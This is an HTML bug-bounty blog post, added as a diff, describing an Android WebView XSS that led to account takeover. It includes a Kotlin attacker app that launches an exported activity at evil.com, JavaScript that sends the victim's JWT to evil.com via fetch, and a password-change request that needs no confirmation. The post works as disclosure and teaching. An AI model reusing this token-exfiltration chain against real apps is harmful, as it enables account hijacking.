@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>WebView XSS, account takeover | shafouz blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="WebView XSS, account takeover" />
+<meta name="author" content="shafouz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Some context: I have been hunting on this one private program for about 6 months. Some time ago i decided to learn how to test mobile apps." />
+<meta property="og:description" content="Some context: I have been hunting on this one private program for about 6 months. Some time ago i decided to learn how to test mobile apps." />
+<link rel="canonical" href="https://shafouz.github.io/2022/11/26/WebView-XSS.html" />
+<meta property="og:url" content="https://shafouz.github.io/2022/11/26/WebView-XSS.html" />
+<meta property="og:site_name" content="shafouz blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-11-26T17:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="WebView XSS, account takeover" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"shafouz"},"dateModified":"2022-11-26T17:00:00+00:00","datePublished":"2022-11-26T17:00:00+00:00","description":"Some context: I have been hunting on this one private program for about 6 months. Some time ago i decided to learn how to test mobile apps.","headline":"WebView XSS, account takeover","mainEntityOfPage":{"@type":"WebPage","@id":"https://shafouz.github.io/2022/11/26/WebView-XSS.html"},"url":"https://shafouz.github.io/2022/11/26/WebView-XSS.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://shafouz.github.io/feed.xml" title="shafouz blog" />
+<!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-F6L4J94HSJ"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-F6L4J94HSJ');
+  </script>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">shafouz blog</a></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">WebView XSS, account takeover</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2022-11-26T17:00:00+00:00" itemprop="datePublished">
+        Nov 26, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Some context: I have been hunting on this one private program for about 6 months. Some time ago i decided to learn how to test mobile apps.</p>
+
+<p>Mobile apps are interesting because you can decompile the java bytecode and perform a very thorough code review on it.</p>
+
+<p>It does have some limitations, sometimes the code can be obfuscated (or optimized?) which makes it harder to read it. But most of the time it works pretty well.</p>
+
+<p>Even if the code is obfuscated you can clean up with tools like Enigma ty minecraft.</p>
+
+<hr />
+
+<p>Actual analysis:
+When testing on android apps. You usually want to look at exported activities.
+While testing this app I found that one of the WebView activities were exported.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;activity</span> <span class="na">android:exported=</span><span class="s">"true"</span> <span class="na">android:name=</span><span class="s">".WebViewDeepLinkHandlerActivity"</span><span class="nt">/&gt;</span>
+</code></pre></div></div>
+<p>This activity called a WebViewFragment and WebViewFragment implemented a JavascriptInterface.
+The code was something like this:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">static</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">getToken</span><span class="o">(</span><span class="nc">String</span> <span class="n">str</span><span class="o">)</span> <span class="o">{</span>
+    <span class="nc">String</span> <span class="n">accessToken</span> <span class="o">=</span> <span class="nc">AccountManager</span><span class="o">.</span><span class="na">getAccessToken</span><span class="o">();</span>
+    <span class="nc">String</span> <span class="n">str2</span> <span class="o">=</span> <span class="n">accessToken</span><span class="o">;</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">accessToken</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">str2</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
+    <span class="o">}</span>
+    <span class="n">baseJavascriptAccessor</span><span class="o">.</span><span class="na">evaluateCallbackJs</span><span class="o">(</span><span class="n">getEnvCallbackData$default</span><span class="o">(</span><span class="n">baseJavascriptAccessor</span><span class="o">,</span> <span class="n">str2</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="kc">null</span><span class="o">),</span> <span class="n">str</span><span class="o">,</span> <span class="n">baseJavascriptAccessor</span><span class="o">.</span><span class="na">webView</span><span class="o">);</span>
+<span class="o">}</span>
+    
+<span class="kd">static</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">evaluateCallbackJs</span><span class="o">(</span><span class="nc">JsCallbackData</span> <span class="n">jsCallbackData</span><span class="o">,</span> <span class="nc">String</span> <span class="n">str</span><span class="o">,</span> <span class="nc">WebView</span> <span class="n">webView</span><span class="o">)</span> <span class="o">{</span>
+    <span class="nc">String</span> <span class="n">str2</span><span class="o">;</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">str</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">jsCallbackData</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="nc">Gson</span> <span class="n">gson</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Gson</span><span class="o">();</span>
+            <span class="n">str2</span> <span class="o">=</span> <span class="n">str</span> <span class="o">+</span> <span class="s">" ("</span> <span class="o">+</span> <span class="o">(!(</span><span class="n">gson</span> <span class="k">instanceof</span> <span class="nc">Gson</span><span class="o">)</span> <span class="o">?</span> <span class="n">gson</span><span class="o">.</span><span class="na">toJson</span><span class="o">(</span><span class="n">jsCallbackData</span><span class="o">)</span> <span class="o">:</span> <span class="nc">GsonInstrumentation</span><span class="o">.</span><span class="na">toJson</span><span class="o">(</span><span class="n">gson</span><span class="o">,</span> <span class="n">jsCallbackData</span><span class="o">))</span> <span class="o">+</span> <span class="sc">')'</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="n">str2</span> <span class="o">=</span> <span class="n">str</span> <span class="o">+</span> <span class="s">" ()"</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">webView</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="nc">WebviewExtKt</span><span class="o">.</span><span class="na">postEvaluateJavaScript</span><span class="o">(</span><span class="n">webView</span><span class="o">,</span> <span class="n">str2</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>What this code does is, it evals the string as javascript like:
+attacker_controlled_string(JSON.stringify(jsCallback))
+So if we can access this method we can call any JS funtion that we want.
+You can access methods from a JavascriptInterface on the window object like window.Android.getToken(“lalala”) but for that we would need to control the url on which the WebView gets opened at. Thankfully for me this Activity allowed me to do just that.
+So we can attack the app via or own app, the attacker app looks like:</p>
+<div class="language-kotlin highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">fun</span> <span class="nf">startExportedActivity</span><span class="p">(</span><span class="n">view</span><span class="p">:</span> <span class="nc">View</span><span class="p">){</span>
+        <span class="k">try</span> <span class="p">{</span>
+            <span class="kd">val</span> <span class="py">intent</span> <span class="p">=</span> <span class="nc">Intent</span><span class="p">()</span>
+            <span class="kd">val</span> <span class="py">uri</span> <span class="p">=</span> <span class="nc">Uri</span><span class="p">.</span><span class="nc">Builder</span><span class="p">()</span>
+            <span class="kd">val</span> <span class="py">url</span> <span class="p">=</span> <span class="n">uri</span>
+                <span class="p">.</span><span class="nf">scheme</span><span class="p">(</span><span class="s">"https"</span><span class="p">)</span>
+                <span class="p">.</span><span class="nf">authority</span><span class="p">(</span><span class="s">"evil.com"</span><span class="p">)</span>
+                <span class="p">.</span><span class="nf">build</span><span class="p">()</span>
+
+            <span class="n">intent</span><span class="p">.</span><span class="nf">setClassName</span><span class="p">(</span><span class="s">"com.app"</span><span class="p">,</span> <span class="s">".WebViewDeepLinkHandlerActivity"</span><span class="p">)</span>
+            <span class="n">intent</span><span class="p">.</span><span class="n">data</span> <span class="p">=</span> <span class="n">url</span>
+
+            <span class="nf">startActivity</span><span class="p">(</span><span class="n">intent</span><span class="p">)</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">e</span><span class="p">:</span> <span class="nc">Exception</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nf">println</span><span class="p">(</span><span class="s">"ERROR: $e"</span><span class="p">)</span>
+            <span class="kd">val</span> <span class="py">toast</span><span class="p">:</span> <span class="nc">Toast</span> <span class="p">=</span> <span class="nc">Toast</span><span class="p">.</span><span class="nf">makeText</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="s">"something went wrong, check logcat"</span><span class="p">,</span> <span class="nc">Toast</span><span class="p">.</span><span class="nc">LENGTH_SHORT</span><span class="p">)</span>
+            <span class="n">toast</span><span class="p">.</span><span class="nf">show</span><span class="p">()</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>What this does is, it calls the exported activity, setting our controlled url (evil.com) on the intent. That will make the Activity open or url inside the WebView.
+On evil.com we have the following code:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+ <span class="nx">setTimeout</span><span class="p">(()</span><span class="o">=&gt;</span><span class="p">{</span>
+   <span class="nb">window</span><span class="p">.</span><span class="nx">Android</span><span class="p">.</span><span class="nx">getToken</span><span class="p">(</span><span class="dl">'</span><span class="s1">function ext(jwt){fetch(`https://evil.com/?jwt=${JSON.stringify(jwt)}`, {mode:"no-cors"})};ext</span><span class="dl">'</span><span class="p">)</span>
+ <span class="p">},</span> <span class="mi">5000</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+<p>Giving us the JWT token of the victim.
+Account takeover
+ Previous on my testing I had found an endpoint that allowed an user to change its password without any kind of confirmation.
+ The default request looked something like:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">PATCH</span> <span class="nn">/api/customers</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">victim.com</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">Bearer &lt;JWT&gt;</span>
+
+{
+  "currentPassword": "password",
+  "newPassword": "newpassword",
+}
+</code></pre></div></div>
+<p>but it only cared for newPassword field so the following would work:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">PATCH</span> <span class="nn">/api/customers</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">victim.com</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">Bearer &lt;JWT&gt;</span>
+
+{
+  "newPassword": "newpassword"
+}
+</code></pre></div></div>
+<p>So we use the JWT token and get full control of the victim account.
+Not the most exciting vulnerability but understanding how JavascriptInterface works was fun.
+ 
+Awarded $2000 + $500 bonus severity considered as high, personally i think this was a critical, but i was content with the bonus.
+Intent: Intent is how apps on Android communicate with each other.
+Webview: Its an embeddable browser with limited features.</p>
+
+<p>References: <a href="https://blog.oversecured.com/Android-security-checklist-webview/">Android-security-checklist-webview</a></p>
+
+  </div><a class="u-url" href="/2022/11/26/WebView-XSS.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="https://shafouz.github.io/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">shafouz</li>
+          <li><a class="u-email" href="mailto:jlmacedomatos@gmail.com">contact</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://hackerone.com/shafou" target="_blank" title="hackerone">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#hackerone"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://github.com/shafouz" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/shafouzzzzzz" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/joao-luca/" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
